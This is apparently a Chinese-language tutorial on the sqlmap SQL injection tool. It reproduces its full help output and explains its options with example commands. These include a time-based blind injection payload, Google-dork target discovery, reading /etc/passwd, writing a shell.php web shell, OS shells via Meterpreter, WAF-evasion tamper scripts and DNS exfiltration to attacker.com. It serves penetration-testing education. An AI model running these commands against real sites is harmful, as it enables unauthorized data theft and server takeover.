# SQL注入漏洞检测利用工具

##  0x01 sqlmap简介

> 开源sql注入漏洞检测、利用工具.sql注入自动化检测及利用工具中的佼佼者。

### 功能特性

+ 检测动态页面中get/post参数、cookie、http头
+ 数据榨取
+ 文件系统访问
+ 操作系统命令执行
+ 引擎强大、特性丰富
+ Xss漏洞检测
+ 其他
  - 功能特点
  ```
  与burpustie、google结合适用，支持正则表达式限定测试目标
  可设置Get、post、cookie、Referer、User-Agent（随机或指定）
  Cookie过期后自动处理Set-Cookie头，更新cookie信息
  限速：最大并发、延迟发送
  支持Basic,Digest,NTLM,CA身份认证
  数据库版本、用户、权限、hash枚举和字典破解、暴力破解表列名称
  文件上传下载、UDF、启动并执行存储过程、操作系统命令执行、访问windows注册表
  与w3af、metasploit集成结合适用，基于数据库服务进程提权和上传执行后门
  ```
  - 日志存储在家目录.sqlmap下
  - 输出内容按详细程度分7个等级.`--verbose=1`
  - 检测内容根据检测详细程度分5个等级`-level=1`
  - 检测根据威胁程度分3个等级.`--risk=1`



### 检测机制

+ 基于布尔的盲注检测

+ 基于时间的盲注检测
```
'and (select * from (select(sleep(20)))a)--+
```

+ 基于错误的检测

+ 基于UNION联合查询的检测
```
适用于通过循坏直接输出联合查询结果，否则只显示第一项结果
```

+ 基于堆叠查询的检测
```
;堆叠多个查询语句
适用于非select的数据修改、删除的操作
```
#### 支持的数据库
```
MySQL,Oracle,PostgreSQL,Microsoft SQL Server,Microsoft Access,IBM DB2,SQLite,Firebird,Sybase,SAP MaxDB
```

## 0x02 使用帮助 `-h/-hh`
```
# sqlmap -hh
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.2#stable}
|_ -| . [(]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org

Usage: python sqlmap [options]

Options:
  -h, --help            Show basic help message and exit
  -hh                   Show advanced help message and exit
  --version             Show program's version number and exit
  -v VERBOSE            Verbosity level: 0-6 (default 1)

  Target:
    At least one of these options has to be provided to define the
    target(s)

    -d DIRECT           Connection string for direct database connection
    -u URL, --url=URL   Target URL (e.g. "http://www.site.com/vuln.php?id=1")
    -l LOGFILE          Parse target(s) from Burp or WebScarab proxy log file
    -x SITEMAPURL       Parse target(s) from remote sitemap(.xml) file
    -m BULKFILE         Scan multiple targets given in a textual file
    -r REQUESTFILE      Load HTTP request from a file
    -g GOOGLEDORK       Process Google dork results as target URLs
    -c CONFIGFILE       Load options from a configuration INI file

  Request:
    These options can be used to specify how to connect to the target URL

    --method=METHOD     Force usage of given HTTP method (e.g. PUT)
    --data=DATA         Data string to be sent through POST
    --param-del=PARA..  Character used for splitting parameter values
    --cookie=COOKIE     HTTP Cookie header value
    --cookie-del=COO..  Character used for splitting cookie values
    --load-cookies=L..  File containing cookies in Netscape/wget format
    --drop-set-cookie   Ignore Set-Cookie header from response
    --user-agent=AGENT  HTTP User-Agent header value
    --random-agent      Use randomly selected HTTP User-Agent header value
    --host=HOST         HTTP Host header value
    --referer=REFERER   HTTP Referer header value
    -H HEADER, --hea..  Extra header (e.g. "X-Forwarded-For: 127.0.0.1")
    --headers=HEADERS   Extra headers (e.g. "Accept-Language: fr\nETag: 123")
    --auth-type=AUTH..  HTTP authentication type (Basic, Digest, NTLM or PKI)
    --auth-cred=AUTH..  HTTP authentication credentials (name:password)
    --auth-file=AUTH..  HTTP authentication PEM cert/private key file
    --ignore-code=IG..  Ignore HTTP error code (e.g. 401)
    --ignore-proxy      Ignore system default proxy settings
    --ignore-redirects  Ignore redirection attempts
    --ignore-timeouts   Ignore connection timeouts
    --proxy=PROXY       Use a proxy to connect to the target URL
    --proxy-cred=PRO..  Proxy authentication credentials (name:password)
    --proxy-file=PRO..  Load proxy list from a file
    --tor               Use Tor anonymity network
    --tor-port=TORPORT  Set Tor proxy port other than default
    --tor-type=TORTYPE  Set Tor proxy type (HTTP, SOCKS4 or SOCKS5 (default))
    --check-tor         Check to see if Tor is used properly
    --delay=DELAY       Delay in seconds between each HTTP request
    --timeout=TIMEOUT   Seconds to wait before timeout connection (default 30)
    --retries=RETRIES   Retries when the connection timeouts (default 3)
    --randomize=RPARAM  Randomly change value for given parameter(s)
    --safe-url=SAFEURL  URL address to visit frequently during testing
    --safe-post=SAFE..  POST data to send to a safe URL
    --safe-req=SAFER..  Load safe HTTP request from a file
    --safe-freq=SAFE..  Test requests between two visits to a given safe URL
    --skip-urlencode    Skip URL encoding of payload data
    --csrf-token=CSR..  Parameter used to hold anti-CSRF token
    --csrf-url=CSRFURL  URL address to visit to extract anti-CSRF token
    --force-ssl         Force usage of SSL/HTTPS
    --hpp               Use HTTP parameter pollution method
    --eval=EVALCODE     Evaluate provided Python code before the request (e.g.
                        "import hashlib;id2=hashlib.md5(id).hexdigest()")

  Optimization:
    These options can be used to optimize the performance of sqlmap

    -o                  Turn on all optimization switches
    --predict-output    Predict common queries output
    --keep-alive        Use persistent HTTP(s) connections
    --null-connection   Retrieve page length without actual HTTP response body
    --threads=THREADS   Max number of concurrent HTTP(s) requests (default 1)

  Injection:
    These options can be used to specify which parameters to test for,
    provide custom injection payloads and optional tampering scripts

    -p TESTPARAMETER    Testable parameter(s)
    --skip=SKIP         Skip testing for given parameter(s)
    --skip-static       Skip testing parameters that not appear to be dynamic
    --param-exclude=..  Regexp to exclude parameters from testing (e.g. "ses")
    --dbms=DBMS         Force back-end DBMS to this value
    --dbms-cred=DBMS..  DBMS authentication credentials (user:password)
    --os=OS             Force back-end DBMS operating system to this value
    --invalid-bignum    Use big numbers for invalidating values
    --invalid-logical   Use logical operations for invalidating values
    --invalid-string    Use random strings for invalidating values
    --no-cast           Turn off payload casting mechanism
    --no-escape         Turn off string escaping mechanism
    --prefix=PREFIX     Injection payload prefix string
    --suffix=SUFFIX     Injection payload suffix string
    --tamper=TAMPER     Use given script(s) for tampering injection data

  Detection:
    These options can be used to customize the detection phase

    --level=LEVEL       Level of tests to perform (1-5, default 1)
    --risk=RISK         Risk of tests to perform (1-3, default 1)
    --string=STRING     String to match when query is evaluated to True
    --not-string=NOT..  String to match when query is evaluated to False
    --regexp=REGEXP     Regexp to match when query is evaluated to True
    --code=CODE         HTTP code to match when query is evaluated to True
    --text-only         Compare pages based only on the textual content
    --titles            Compare pages based only on their titles

  Techniques:
    These options can be used to tweak testing of specific SQL injection
    techniques

    --technique=TECH    SQL injection techniques to use (default "BEUSTQ")
    --time-sec=TIMESEC  Seconds to delay the DBMS response (default 5)
    --union-cols=UCOLS  Range of columns to test for UNION query SQL injection
    --union-char=UCHAR  Character to use for bruteforcing number of columns
    --union-from=UFROM  Table to use in FROM part of UNION query SQL injection
    --dns-domain=DNS..  Domain name used for DNS exfiltration attack
    --second-order=S..  Resulting page URL searched for second-order response

  Fingerprint:
    -f, --fingerprint   Perform an extensive DBMS version fingerprint

  Enumeration:
    These options can be used to enumerate the back-end database
    management system information, structure and data contained in the
    tables. Moreover you can run your own SQL statements

    -a, --all           Retrieve everything
    -b, --banner        Retrieve DBMS banner
    --current-user      Retrieve DBMS current user
    --current-db        Retrieve DBMS current database
    --hostname          Retrieve DBMS server hostname
    --is-dba            Detect if the DBMS current user is DBA
    --users             Enumerate DBMS users
    --passwords         Enumerate DBMS users password hashes
    --privileges        Enumerate DBMS users privileges
    --roles             Enumerate DBMS users roles
    --dbs               Enumerate DBMS databases
    --tables            Enumerate DBMS database tables
    --columns           Enumerate DBMS database table columns
    --schema            Enumerate DBMS schema
    --count             Retrieve number of entries for table(s)
    --dump              Dump DBMS database table entries
    --dump-all          Dump all DBMS databases tables entries
    --search            Search column(s), table(s) and/or database name(s)
    --comments          Retrieve DBMS comments
    -D DB               DBMS database to enumerate
    -T TBL              DBMS database table(s) to enumerate
    -C COL              DBMS database table column(s) to enumerate
    -X EXCLUDECOL       DBMS database table column(s) to not enumerate
    -U USER             DBMS user to enumerate
    --exclude-sysdbs    Exclude DBMS system databases when enumerating tables
    --pivot-column=P..  Pivot column name
    --where=DUMPWHERE   Use WHERE condition while table dumping
    --start=LIMITSTART  First dump table entry to retrieve
    --stop=LIMITSTOP    Last dump table entry to retrieve
    --first=FIRSTCHAR   First query output word character to retrieve
    --last=LASTCHAR     Last query output word character to retrieve
    --sql-query=QUERY   SQL statement to be executed
    --sql-shell         Prompt for an interactive SQL shell
    --sql-file=SQLFILE  Execute SQL statements from given file(s)

  Brute force:
    These options can be used to run brute force checks

    --common-tables     Check existence of common tables
    --common-columns    Check existence of common columns

  User-defined function injection:
    These options can be used to create custom user-defined functions

    --udf-inject        Inject custom user-defined functions
    --shared-lib=SHLIB  Local path of the shared library

  File system access:
    These options can be used to access the back-end database management
    system underlying file system

    --file-read=RFILE   Read a file from the back-end DBMS file system
    --file-write=WFILE  Write a local file on the back-end DBMS file system
    --file-dest=DFILE   Back-end DBMS absolute filepath to write to

  Operating system access:
    These options can be used to access the back-end database management
    system underlying operating system

    --os-cmd=OSCMD      Execute an operating system command
    --os-shell          Prompt for an interactive operating system shell
    --os-pwn            Prompt for an OOB shell, Meterpreter or VNC
    --os-smbrelay       One click prompt for an OOB shell, Meterpreter or VNC
    --os-bof            Stored procedure buffer overflow exploitation
    --priv-esc          Database process user privilege escalation
    --msf-path=MSFPATH  Local path where Metasploit Framework is installed
    --tmp-path=TMPPATH  Remote absolute path of temporary files directory

  Windows registry access:
    These options can be used to access the back-end database management
    system Windows registry

    --reg-read          Read a Windows registry key value
    --reg-add           Write a Windows registry key value data
    --reg-del           Delete a Windows registry key value
    --reg-key=REGKEY    Windows registry key
    --reg-value=REGVAL  Windows registry key value
    --reg-data=REGDATA  Windows registry key value data
    --reg-type=REGTYPE  Windows registry key value type

  General:
    These options can be used to set some general working parameters

    -s SESSIONFILE      Load session from a stored (.sqlite) file
    -t TRAFFICFILE      Log all HTTP traffic into a textual file
    --batch             Never ask for user input, use the default behavior
    --binary-fields=..  Result fields having binary values (e.g. "digest")
    --check-internet    Check Internet connection before assessing the target
    --crawl=CRAWLDEPTH  Crawl the website starting from the target URL
    --crawl-exclude=..  Regexp to exclude pages from crawling (e.g. "logout")
    --csv-del=CSVDEL    Delimiting character used in CSV output (default ",")
    --charset=CHARSET   Blind SQL injection charset (e.g. "0123456789abcdef")
    --dump-format=DU..  Format of dumped data (CSV (default), HTML or SQLITE)
    --encoding=ENCOD..  Character encoding used for data retrieval (e.g. GBK)
    --eta               Display for each output the estimated time of arrival
    --flush-session     Flush session files for current target
    --forms             Parse and test forms on target URL
    --fresh-queries     Ignore query results stored in session file
    --har=HARFILE       Log all HTTP traffic into a HAR file
    --hex               Use DBMS hex function(s) for data retrieval
    --output-dir=OUT..  Custom output directory path
    --parse-errors      Parse and display DBMS error messages from responses
    --save=SAVECONFIG   Save options to a configuration INI file
    --scope=SCOPE       Regexp to filter targets from provided proxy log
    --test-filter=TE..  Select tests by payloads and/or titles (e.g. ROW)
    --test-skip=TEST..  Skip tests by payloads and/or titles (e.g. BENCHMARK)
    --update            Update sqlmap

  Miscellaneous:
    -z MNEMONICS        Use short mnemonics (e.g. "flu,bat,ban,tec=EU")
    --alert=ALERT       Run host OS command(s) when SQL injection is found
    --answers=ANSWERS   Set question answers (e.g. "quit=N,follow=N")
    --beep              Beep on question and/or when SQL injection is found
    --cleanup           Clean up the DBMS from sqlmap specific UDF and tables
    --dependencies      Check for missing (non-core) sqlmap dependencies
    --disable-coloring  Disable console output coloring
    --gpage=GOOGLEPAGE  Use Google dork results from specified page number
    --identify-waf      Make a thorough testing for a WAF/IPS/IDS protection
    --mobile            Imitate smartphone through HTTP User-Agent header
    --offline           Work in offline mode (only use session data)
    --purge-output      Safely remove all content from output directory
    --skip-waf          Skip heuristic detection of WAF/IPS/IDS protection
    --smart             Conduct thorough tests only if positive heuristic(s)
    --sqlmap-shell      Prompt for an interactive sqlmap shell
    --tmp-dir=TMPDIR    Local directory for storing temporary files
    --web-root=WEBROOT  Web server document root directory (e.g. "/var/www")
    --wizard            Simple wizard interface for beginner users

```

##  0x03 选项讲解 
### 常用选项
+ `-p`: 指定检测参数如`-p username`,指定检测username对应的参数.
+ `--banner`: 获取检测目标的数据库系统信息
+ `--dbs`: 获取检测目标的数据库条目信息
+ `--schema`: 获取infomation_schema数据库信息
+ `-a`: 做所有检测(all)
+ `--users`: 检测数据库用户
+ `--tamper`: 使用Payload混淆脚本(脚本位置`/usr/share/sqlmap/tamper`)
+ `--level` : 检测详细程度
+ 指纹信息 `-f,--fingerprint,-b,--banner`
```
检测数据库管理系统指纹信息
DBMS，操作系统，架构，补丁
```

### Target 选择
+ 直接连接`-d`
```
sqlmap -d "mysql://USER:PASSWORD@DBMS_IP:DBMS_PORT/DATABASE_NAME"
```

+ 通过URL(GET方法)`-u`
```
sqlmap -u "http://192.168.1.121/sqlmap/mysql/get_int.php?id=1&cat=2"
```

+ 通过URL列表`-m`
```
sqlmap sqlmap -m url-list.txt
url-list.txt中一行一个检测地址
```

+ 通过Google自动查找目标`-g`
```
sqlmap -g "+ext:php +inurl:"&id=" +intext:"powered by ""
```

+ 通过post方法
```
需要结合Burp类工具,截取请求头,保存为文件.
sqlmap -r request.txt
```

+ 通过burp的log文件
```
sqlmap -l log.txt
注: burp的log设置在Project options里的Misc
```

+ 利用站点地图
```
sqlmap -x sitemap.xml
```

+ 通过载入配置文件
```
sqlmap -c sqlmap.conf  #程序默认就有一个,可以dpkg -L sqlmap | grep .conf
```

### Request 配置
+ 数据段 `--data`
> get/post都适用
  ```
   sqlmap -u "http://1.1.1.1/a.php" --data="user=1&pass=2" --dbs
  ```
  
+ 指定变量分隔符：`--param-del`
```
http://1.1.1.1/a.php?q=foo;id=1    // ;  &
sqlmap -u "http://1.1.1.1/a.php" --data="q=foo:id=1" --param-del=";" -f
```

+ cookie头 `--cookie`, `--load-cookies`, `--cookie-del`
```
web应用需要基于cookie的身份认证
检查cookie中的注入点（sqlmap自动测试）
sqlmap -u "http://1.1.1.1/a.php?id=1" --cookie="a=1;b=2" --dbs
```
**注意**: 默认sqlmap会自动读取set-Cookie,自动设置新的Cookie,如果不想要自动生成的Cookie,可以添加参数 `--drop-set-cookie`

+ User-Agent `--user-agent`, `--random-agent`
```
默认User-Agent带sqlmap版本特征,不建议使用.
sqlmap -u http://xx --user-agent="User-Agent" --dbms
sqlmap -u http://xx  --random-agent --dbms 
# 会自动随机调用/usr/share/sqlmap/txt/user-agents.txt里面的值
```

+ Host头`--host`
+ Referer头 `--referer`
+ 额外的或自定义的header `--headers`
  ```
  每个头单独一行,所以要有\n（名称分区大小写）
  sqlmap -u "http://1.1.1.1/a.php?id=1" --
  headers="Host:www.a.com\nUser-Agent:Opera\nTest:test"
  ```
+ 使用特定请求方法`--method`
```
sqlmap -u "http://1.1.1.1/a.php?id=1" --method="GET"
```

+ 基于HTTP协议的身份验证 `--auth-type=AUTH`,`--auth-cred=AUTH`, `--auth-file=AUTH` 
> Basic  
> Digest  
> NTLM  
> 证书登录  

```
sqlmap -u "http://1.1.1.1/a.php?id=1" --auth-type Basic --auth-cred "user:pass"

证书登录
--auth-cert / --auth-file
--ath-file="/path/to/ca.pem"
含有私有的PEM格式证书文件
PEM格式的证书链文件
```

+ http(s)代理 `--proxy`, `--proxy-cred`,`--ignore-proxy`
```
--proxy="http://127.0.0.1:8087"
--proxy-cred="name:pass"
--ignore-proxy
    忽略系统级代理设置，通常用于扫描本地网络目标
sqlmap -u "http://1.1.1.1/a.php?id=1" --proxy="http://127.0.0.1:8080" -f
```

+ 基于Header的注入检测
> 检测Host, level=5
> 检测User-Agent,Referer level>=3
> 检测Cookie, level>=2

+ 延时 `--delay`
> 每次http(s)请求之间延迟时间，浮点数，单位为秒,默认无延迟

+ 超时 `--timeout`
> 请求超时时间，浮点数，默认为30秒

+ 重试 `--retries`
> http(s)连接超时重试次数，默认3次

+ 合法随机值 `--randomize`
> 长度、类型与原始值保持一致的前提下，指定每次请求随机取值的参数名
```
sqlmap -u "http://1.1.1.1/a.php?id=1" --randomize="id" --dbs
```



+ 合法请求频率 `--safe-url/--safe-freq`必须结合使用
```
检测和盲注阶段会产生大量失败请求，服务器端可能因此销毁session
每发送--safe-freq次注入请求后，发送一次正常请求
此外还有--safe-post,--safe-req参数
```

+ 跳过URL编码 `--skip-urlencode`
> 默认Get方法会对传输内容进行编码，某些WEB服务器不遵守RFC标准编码，使用原始字符提交数据

+ 检测https `--force-ssl`
```
sqlmap -u "http://1.1.1.1/a.php?id=1:8843" --force-ssl
```

+ 执行自定义代码 `--eval`
```
每次请求前执行指定的python代码
每次请求更改或增加新的参数值（时间依赖、其他参数值依赖）
sqlmap -u
"http://1.1.1.1/a.php?id=1&hash=c4ca4238a0b923820dcc509a6f75849b"
--eval="import hashlib;hash=hashlib.md5(id).hexdigest()"
```

### Optimization配置(优化配置)
+ `--predict-output`
> 根据测试方法，对比返回值和统计值内容，不断缩小检测范围，提高检测效率
> 对比内容: 版本名、用户名、密码、Privileg、role、数据库名称、表名、列名
> 对比统计表：/usr/share/sqlmap/txt/common-outputs.txt
> **与--threads参数不兼容**

+ `--keep-alive`
> 使用http(s)长连接，性能好
> 长连接避免重复建立连接的网络开销，但大量长连接会严重占用服务器资源
> **与--proxy参数不兼容**

+ `--null-connection`
> 只获取相应页面的大小值，而非页面具体内容
> 通常用于盲注判断 真/假，降低网络带宽消耗
> **与--text-only参数不兼容（基于页面内容的比较判断 真/假）**

+ `--threads`
> 最大并发线程
> 盲注时每个线程获取一个字符。获取完成后线程结束
> 默认值为1，建议不要超过10,否则可能影响站点可用性
> **与 --predict-output参数不兼容**


+ `-o` 
> 开启前三个性能参数（除--threads参数） 

### Injectiom 配置
+ 指定扫描的参数 `-p`  
  - 会使`--level`失效
  - `-p "user-agent,id"`
+ 排除特定扫描参数 `--skip` 
> `--level=5 --skip=“id,user-agent“`

+ 注入伪静态url, 参数后加 `*`, 与之相反 `--skip-static`
```
sqlmap -u "http://targeturl/param1/value1*/param2"
```

+ 指定数据库管理系统 `--dbms`
```
一些常见选项
MySQL<5.0>
Oracle<11i>
Microsoft SQL Server<2005>
PostgreSQL
Microsoft Access
SQLite
Firebird
Sysbase
SAP MaxDB
DBS
```

+ 指定os `--os`
`Linux  Windows Unix`

+ 使参数失效 `--invalid-bignum / --invalid-logical / --invalid-string `
```
通常sqlmap使用负值参数取值失效id=13->id=-13
bignum使用大数使参数值失效id=99999999
logical使用布尔判断取值失效id=13 AND 18=19
```

+ 关闭空格取代 null `--no-cast`
```
榨取数据时，sqlmap默认将所有结果转换为字符串，并用空格替换NULL结果
老版本mysql数据库需要开启此开关
```

+ 关闭单引号char()绕过 `--no-escape`
```
出于混淆和避免出错的目的，payload中用单引号界定字符串时，sqlmaps使用char()编码逃逸的方法替换字符串
SELECT 'foo'->SELECT CHAR(102)+CHAR(111)+CHAR(111）
```

+ 使用前缀/后缀 `--prefix / --suffix`  
  ```
  需要先探测闭合情况,如
  SQL语句: 
  query="SELECT * FROM user WHERE id=('",$_GET['id',"') LIMIT 0,1";

  sqlmap -u "http://192.168.136.1.121/sqlmap/sysql/get_str_brackets.php?id=1" -p id --prefix"')" --suffix "AND('abc'='abc"

  结果: 
  query="SELECT * FROM users WHERE id=('1') <PAYLOAD> AND ('adc'='abc') LIMIT 0,1";
  ```

+ **使用脚本** `--tamper`
```
混淆脚本，用于绕过应用层过滤、IPS、WAF, 
内置脚本位置 /usr/share/sqlmap/tamper
sqlmap -u "http://1.1.1.1/a.php?id=1" --tamper="benween.py,space2comment.py" --dbs
```

### Detection 检测内容标准配置
+ `--level`
```
1-5级（默认 1）
根据level不同,调用/usr/share/sqlmap/xml/payloads里的不同内容
```
+ `--risk`
```
1-4（默认 1/无害）
risk升高可造成数据被篡改等风险（update）
```

+ 内容检测判断    
 `--string,--not-string,--regexp,--code`,
 `--text-only,--titles`
```
页面比较，基于布尔的注入检测，依据返回页面内容的变化判断真假逻辑，有些页面随时间阈值变化，此时需要人为指定标识真假的字符串或其它判断依据
```

### Techniques 探测技术配置
+ `--technique` 
```
可选项: "BEUSTQ"
默认使用全部技术
B:Boolean-based blind
E:Error-based
U:Union query-based
S:Stacked queries（文件系统、操作系统，注册表必须）
T:Time-based blind
Q:inline_query
```

+ `--time-sec`
> 基于时间的注入检测响应延迟时间
+ `--union-cols`
```
默认联合查询1-10列，--level增加1,多查询10列,最多支持50列
--union-cols 6-9
```

+ `--union-char`
```
联合查询默认使用NULL，极端情况下NULL可能失败，此时可以手动执行数值
--union-char 123
```

+ `--union-from`  
>  选择联合查询注入的表

+ `--dns-domain`
```
攻击者控制了某DNS服务器，使用此功能可以提高数据榨取的速度
--dns-domain attacker.com
```

+ `--second-order`
```
在一个页面注入的结果，从另一个页面体现出来
--second-order http://1.1.1.1/b.php
```

+ `--second-order`
```
指定显示出结果的页面,适用于在一个页面注入,从另一个页面体现出来
--second-order http://1.1.1.1/b.php
```

### Enumeration 配置爆破项
+ `--current-user`
+ `--current-db`
+ `--hostname`
+ `--users`
+ `--privileges -U username` , 检测指定用户权限
+ `--roles`
+ `--is-dba`
+ `--passwords` 爆破数据库密码
+ `--dbs` **爆破数据库**
+ `--tables` **爆破表**
+ `--columns` **爆破列**
+ `-D DB` 
+ `-T TBL`
```
sqlmap -u "url" -D dvwa -T user  --columns  --start=10 --stop=20
```
+ `-C COL`
+ `--start,--stop` 指定显示第几项,如果内容过多,可以合理使用
+ `-X EXCLUDECOL` 与`-C`相反
+ `-U USER` 指定用户
+ `--dump` **dump数据内容**
+ `--dump-all`
+ `--schema` 查--schmema表,即查所有内容,前提是有权限.
+ `--exclude-sysdbs` 排除系统默认函数
+ `--sql-shell`  获取sql-shell
+ `--sql-query`
```
--sql-query "select * from users"
```

### Brute force 字典爆破
```
Mysql<5.0,没有information_schema库
Mysql>=5.0,但无权读取information_schema库
微软的access数据库，默认无权读取MSysObjects库
```
+ --common-tables 爆破表
+ --common-columns 爆破列

### User-defined function injection
+ --udf-inject
+ --shared-lib
```
编译共享库创建并上传至DB Server,以此生成UDF实现高级注入
Linux:  shared object
Windows:  DLL
```
参考链接 http://www.slideshare.net/inquis/advanced-sql-injection-to-operating-system-full-control-whitepaper-4633857

### File system access
```
--file-read="/etc/passwd"
--file-write="shell.php" --file-dest"/tmp/shell.php"
```

### OS 系统访问
```
Mysql、postgresql
    上传共享库并生成sys_exec()、sys_eval()两个UDF
Mssql
    xp_cmdshell存储过程（有九用，禁了启，没有键）
```
+ `--os-shell`
+ `--os-cmd=command`
+ 攻击提权结合meterpreter的 `--os-pwn`, `--os-smbrelay`, `--msf-path=MSFPATH`
+ 存储过程缓冲区溢出攻击 `--os-bof`
+ 提权 `--priv-esc`

###  Window注册表访问
+ --reg-read
+ --reg-add
+ --reg-del
+ --reg-key、--reg-value、--reg-data、--reg-type
```
sqlmap.py -u="http://1.1.1.1/a.php?id=1 --reg-add\ --reg-key="HKEY_LOCAL_MACHINE\SOFTWARE\sqlmap" --reg-value=Test --reg-type=REG-SZ --reg-data=1
```

### General 常规设置
- `-s`: sqlite会话文件保存位置
- `-t`: 记录流浪文件保存位置
- `--charset`: 强制字符编码`--charset=GBK`
- `--crawl`: 从起始位置爬站深度
    `--batch --crawl=3`
- `--csv-del`: dump数据默认存于","分割的CSV文件中，指定其他分隔符`-csv-del=";"`
- `--dump-format` : 可选项有`(CSV (default), HTML or SQLITE`
- `--dbms-cred`: 指定数据库账号
- `--flush-session`: 清空session
- `--fresh-queries`: 忽略session查询结果
- `--hex`: dump非ASCII字符内容时，将其编码为16进制形式，收到后解码还原
```
sqlmap -u "http://1.1.1.1/s.php?id=1" --hex -v 3
```
- `--output-dir=/tmp`
- `--parse-error`: 分析和现实数据库内建报错信息
```
sqlmap -u "http://1.1.1.1/sqlmap/a.php?id=1" --parse-errors
```
- `--save=./sqlmap.conf:` 将命令保存成配置文件,之后可以`-c`载入使用
- `--scope` 指定范围,用于过滤抓取的Burp.log里的url
```
过滤日志内容，通过正则表达式筛选扫描对象
sqlmap -l burp.log --scope="(www)?\.target.\.(com|net|org)"
sqlmap -l burp.log --scope="(19)?\.168\.20\.(1|10|100)" --level 3 -dbs
```

### Misc 杂项设置
+ `-z`: 参数助记符

```
sqlmap --batch --random-agent --ignore-proxy --technique=BEU -u
"1.1.1.1/a.php?id=1"
写做:
sqlmap -z "bat,randcma,ign,tec=BEU" -u "1.1.1.1/a.php?id=1"

sqlmap -ignore-proxy --flush-session --technique=U --dump -D testdb -
T user -u "1.1.1.1/a.php?id=1"
写做:
sqlmap -z "ign,flu,bat,tec=U,dump,D=testdb,T=users" -u
"1.1.1.1/vuln.php?id=1"
```
+ `--answer` 提前设定问题答案,可以结合`--batch`
```
sqlmap -u "http://1.1.1.1/a.php?id=1" --technique=E --
answers="extending=N" --batch
```
+ `--check-waf`: 检测WAF/IPS/IDS
+ `--hpp`: HTTP parameter pollution, http参数污染
> 绕过WAF/IPS/IDS的有效方法
> 尤其对ASP/ISS 和 ASP.NET/IIS
+ `--identify-waf`: 彻底的waf/ips/ids检查
    支持30多种产品
- `--mobile`: 模拟智能手机设备
- `--purge-output`: 清除output文件夹
- `--smart:` 当有大量检测目标时，只选择基于错误的检测结果
- `--wizard`: 简单向导
